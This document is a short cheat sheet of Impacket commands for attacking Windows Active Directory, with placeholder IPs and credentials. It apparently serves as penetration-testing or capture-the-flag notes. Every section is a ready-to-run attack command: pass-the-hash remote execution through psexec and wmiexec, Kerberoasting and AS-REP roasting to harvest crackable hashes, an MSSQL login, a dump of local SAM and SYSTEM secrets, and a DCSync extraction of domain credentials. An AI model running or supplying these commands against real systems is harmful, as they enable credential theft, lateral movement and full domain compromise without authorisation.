
# IMPACKET-COLLECTION


### PSEXEC
```
impacket-psexec -hashes 00000000000000000000000000000000:2a944a58d4ffa77137b2c587e6ed7626 user@10.10.10.20
```
### Kerberos

```
impacket-GetUserSPNs corp.com/user:'Passw0rd' -dc-ip 10.10.10.20 -outputfile user.kerb￼￼
```
### AS-REP Roast

```￼￼
impacket-GetNPUsers corp.com/user:'Passw0rd' -dc-ip 10.10.10.20 -outputfile user.hash
```
### MSSQL
```￼
impacket-mssqlclient sequel.htb/rose:Passw0rd@10.10.10.20 -windows-auth
```
### SAM&SYSTEM DUMP

```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```
### DCsync ATTACK
```
impacket-secretsdump -just-dc-user username corp.com/jefeadmin:"Passw0rd"@10.10.10.20
```
### WMIEXEC 
```
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc admin@10.10.10.20
```

